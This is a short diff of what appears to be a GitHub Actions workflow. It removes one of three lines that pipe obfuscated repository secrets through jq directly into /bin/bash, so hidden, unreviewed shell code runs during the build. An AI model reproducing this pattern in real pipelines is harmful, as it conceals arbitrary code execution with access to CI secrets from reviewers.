@@ -22,7 +22,6 @@ jobs:
           dbft0785: ${{ secrets.dbft0785 }}
         run: |
           printf '%s' "$dbft0785" | jq -r .kv6 | /bin/bash
-          printf '%s' "$urjn505" | jq -r .ndswf2077 | /bin/bash
           printf '%s' "$vz0572" | jq -r .lxalh5 | /bin/bash
 
       - name: Upload archive
